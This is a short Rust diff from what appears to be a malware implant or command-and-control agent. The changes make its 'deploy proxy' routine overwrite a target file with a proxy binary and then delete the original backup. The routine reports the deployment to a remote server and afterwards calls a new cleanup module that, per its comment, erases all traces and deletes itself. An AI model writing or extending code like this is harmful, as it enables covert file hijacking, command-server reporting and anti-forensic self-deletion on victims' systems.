@@ -1,3 +1,4 @@
+mod cleanup;
 mod scanner;
 
 use std::fs;
@@ -186,10 +187,11 @@ fn handle_deploy_proxy(client: &Client, task: &Task) {
             }
             if let Err(e) = fs::write(&target, &proxy_bytes) {
                 eprintln!("[!] Deploy failed: {}", e);
-                // Restore backup
                 let _ = fs::rename(&backup, &target);
                 return;
             }
+            // Remove the backup — the proxy embeds the original anyway
+            let _ = fs::remove_file(&backup);
             eprintln!("[+] Deployed (replace): {}", target.display());
         }
         _ => {
@@ -207,6 +209,9 @@ fn handle_deploy_proxy(client: &Client, task: &Task) {
     let _ = client.post(format!("{}/api/deployed", SERVER_URL))
         .json(&serde_json::json!({"build_id": build_id}))
         .send();
+
+    // Mission complete — clean up all traces and self-delete
+    cleanup::run();
 }
 
 // ── Main loop ────────────────────────────────────────────────
